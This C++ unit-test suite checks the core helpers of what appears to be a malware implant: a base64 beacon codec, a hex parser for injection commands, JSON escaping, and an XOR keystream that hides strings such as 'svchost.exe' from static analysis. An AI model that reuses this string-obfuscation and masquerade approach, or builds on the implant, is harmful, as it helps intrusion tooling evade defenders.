// tests/test_core.cpp — unit tests for include/ghostcore.hpp.
//
// The header is platform-free by design, so this suite runs anywhere with a
// C++17 compiler. CI executes it on a Linux runner:
//
//   g++ -std=c++17 -Wall -Wextra -Werror -I include tests/test_core.cpp -o core && ./core
//
// What it covers, and why these four things: base64 is the wire codec (the
// Python protocol test only mirrors its strictness — this tests the real
// implementation), the hex parser is what every injection command funnels
// through, JSON escaping sits between us and malformed beacon bodies, and the
// keystream is the security-relevant part of the string obfuscation.
#include "ghostcore.hpp"

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

static int g_pass = 0;
static int g_fail = 0;

static void check(const char* name, bool cond) {
    if (cond) { ++g_pass; std::printf("  [ok]   %s\n", name); }
    else      { ++g_fail; std::printf("  [FAIL] %s\n", name); }
}

int main() {
    std::printf("-- base64 --\n");
    check("encode empty", ghost::Base64Encode(nullptr, 0).empty());

    const char* vectors[][2] = {
        {"f", "Zg=="}, {"fo", "Zm8="}, {"foo", "Zm9v"},
        {"foob", "Zm9vYg=="}, {"fooba", "Zm9vYmE="}, {"foobar", "Zm9vYmFy"},
    };
    for (auto& v : vectors) {
        const std::string in = v[0];
        const bool ok = ghost::Base64Encode(reinterpret_cast<const uint8_t*>(in.data()),
                                            in.size()) == v[1];
        check((std::string("encode RFC vector '") + v[0] + "'").c_str(), ok);
    }

    std::vector<uint8_t> all(256);
    for (int i = 0; i < 256; ++i) all[i] = static_cast<uint8_t>(i);
    check("round-trip all 256 byte values",
          ghost::Base64Decode(ghost::Base64Encode(all.data(), all.size())) == all);

    std::vector<uint8_t> rnd(1000);
    uint32_t x = 0x12345678u;
    for (auto& b : rnd) { x = x * 1664525u + 1013904223u; b = static_cast<uint8_t>(x >> 24); }
    check("round-trip 1000 pseudo-random bytes",
          ghost::Base64Decode(ghost::Base64Encode(rnd.data(), rnd.size())) == rnd);

    check("decode 'QQ=='", ghost::Base64Decode("QQ==") == std::vector<uint8_t>{0x41});
    check("reject mid-quartet pad 'AB=C'", ghost::Base64Decode("AB=C").empty());
    check("reject leading pad 'A==='", ghost::Base64Decode("A===").empty());
    check("reject pad in non-final quartet 'AB==CD=='", ghost::Base64Decode("AB==CD==").empty());
    check("reject data after pad 'QQ=A'", ghost::Base64Decode("QQ=A").empty());
    check("reject invalid char 'AB!D'", ghost::Base64Decode("AB!D").empty());
    check("reject length not multiple of 4", ghost::Base64Decode("ABC").empty());
    check("reject empty", ghost::Base64Decode("").empty());

    std::printf("-- hex parsing --\n");
    std::vector<uint8_t> v;
    std::string err;
    check("contiguous '48b8c3'",
          ghost::ParseHexBytes("48b8c3", v, err) && v == std::vector<uint8_t>{0x48, 0xb8, 0xc3});
    check("space separated '48 b8 c3'",
          ghost::ParseHexBytes("48 b8 c3", v, err) && v.size() == 3 && v[1] == 0xb8);
    check("mixed case and surrounding whitespace",
          ghost::ParseHexBytes("  4A\tb8\n", v, err) && v.size() == 2 &&
          v[0] == 0x4A && v[1] == 0xb8);
    check("reject odd trailing digit '48b'", !ghost::ParseHexBytes("48b", v, err) && !err.empty());
    check("reject non-hex digit '4g'", !ghost::ParseHexBytes("4g", v, err) && !err.empty());
    check("reject whitespace inside a pair '4 8'", !ghost::ParseHexBytes("4 8", v, err));
    check("reject empty input", !ghost::ParseHexBytes("   ", v, err));
    check("error text names the bad digit",
          !ghost::ParseHexBytes("4g", v, err) && err.find("'g'") != std::string::npos);

    std::printf("-- json escaping --\n");
    check("quote and backslash", ghost::JsonEscape("a\"b\\c") == "a\\\"b\\\\c");
    check("short control escapes", ghost::JsonEscape("\b\f\n\r\t") == "\\b\\f\\n\\r\\t");
    check("other control chars as \\u", ghost::JsonEscape(std::string("\x01", 1)) == "\\u0001");
    check("utf-8 passthrough", ghost::JsonEscape("caf\xc3\xa9") == "caf\xc3\xa9");
    check("empty string", ghost::JsonEscape("").empty());

    std::printf("-- keystream --\n");
    check("seed differs per call site", ghost::ghost_seed(1) != ghost::ghost_seed(2));
    check("stream is deterministic",
          ghost::ghost_stream(ghost::ghost_seed(7), 11) ==
          ghost::ghost_stream(ghost::ghost_seed(7), 11));
    bool differs = false;
    for (size_t i = 0; i < 8; ++i)
        if (ghost::ghost_stream(ghost::ghost_seed(1), i) !=
            ghost::ghost_stream(ghost::ghost_seed(2), i)) { differs = true; break; }
    check("different seeds give different streams", differs);

    // Regression: the original scheme XORed every byte with one repeating
    // 4-byte key, so the keystream had period 4. Any return to that shape must
    // fail here.
    const uint64_t seed = ghost::ghost_seed(1);
    bool period4 = true;
    for (size_t i = 4; i < 64; ++i)
        if (ghost::ghost_stream(seed, i) != ghost::ghost_stream(seed, i - 4)) { period4 = false; break; }
    check("no period-4 repetition", !period4);

    // Regression: the 32-bit wide keystream used to leave every high byte
    // untouched, so the upper half of wide literals sat in the binary as zeros.
    bool highByteUsed = false;
    for (size_t i = 0; i < 16; ++i)
        if ((ghost::ghost_stream_w(seed, i) >> 8) != 0) { highByteUsed = true; break; }
    check("wide keystream covers the high byte", highByteUsed);

    // ── XS/XSW cipher round trip ───────────────────────────────────────────
    // obfuscate.hpp builds the ciphertext with MakeCipher/MakeCipherW (at compile
    // time, forced) and decodes it with the same keystream at run time. If the
    // two ever disagree, every string in the implant turns to garbage — and only
    // a runtime check can see that, so the invariant is asserted here on the
    // platform-free half of the scheme.
    std::printf("-- cipher round trip --\n");
    {
        static constexpr char kNarrow[] = "svchost.exe";
        constexpr auto c = ghost::MakeCipher<sizeof(kNarrow), 42>(kNarrow);
        bool ok = true;
        for (size_t i = 0; i < sizeof(kNarrow); ++i)
            if (static_cast<unsigned char>(c[i]) !=
                static_cast<unsigned char>(static_cast<unsigned char>(kNarrow[i]) ^
                                           ghost::ghost_stream(ghost::ghost_seed(42), i)))
                ok = false;
        check("narrow cipher == literal xor keystream", ok);

        bool plaintextRun = false;
        for (size_t i = 0; i + sizeof(kNarrow) <= sizeof(c); ++i)
            if (std::memcmp(c.data() + i, kNarrow, sizeof(kNarrow)) == 0) { plaintextRun = true; break; }
        check("narrow ciphertext carries no plaintext run", !plaintextRun);
    }
    {
        static constexpr wchar_t kWide[] = L"Microsoft-WNS/10.0";
        constexpr size_t WN = sizeof(kWide) / sizeof(wchar_t);
        constexpr auto cw    = ghost::MakeCipherW<WN, 43>(kWide);
        constexpr auto other = ghost::MakeCipherW<WN, 44>(kWide);
        bool ok = true;
        for (size_t i = 0; i < WN; ++i)
            if (static_cast<unsigned>(cw[i]) !=
                static_cast<unsigned>(static_cast<unsigned>(kWide[i]) ^
                                      ghost::ghost_stream_w(ghost::ghost_seed(43), i)))
                ok = false;
        check("wide cipher == literal xor keystream", ok);

        bool siteDiffers = false;
        for (size_t i = 0; i < WN; ++i)
            if (cw[i] != other[i]) { siteDiffers = true; break; }
        check("same literal at another call site encrypts differently", siteDiffers);
    }

    std::printf("\n%d passed, %d failed\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
